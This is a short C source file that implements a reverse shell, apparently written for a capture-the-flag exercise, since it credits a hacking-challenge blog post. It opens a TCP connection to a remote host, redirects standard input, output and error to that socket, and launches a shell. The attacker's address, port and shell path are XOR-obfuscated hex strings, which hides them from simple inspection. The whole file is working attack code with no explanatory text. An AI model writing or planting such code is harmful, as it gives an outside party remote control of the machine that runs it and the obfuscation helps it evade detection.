/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include "xor.h"
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define LHOST xor( from_hex(lhost), "9dbb7ad4d2eef6ed3a7561d2e3779b98")
#define LPORT xor( from_hex(lport), "9dbb7ad4d2eef6ed3a7561d2e3779b98")
#define SHELL xor( from_hex(shell), "9dbb7ad4d2eef6ed3a7561d2e3779b98")


int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;
    //Have to declare strings as char arrays to prevent
    // gcc from storing them in read-only memory
    // (https://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha)
    char lhost[] = "085d504c06575c1a5502554b5506";
    char lport[] = "0d5051";
    char shell[] = "16060b0c180305470c";

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(LHOST);
    sa.sin_port = htons(atoi(LPORT));

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve(SHELL, 0, 0);
    return 0;
}
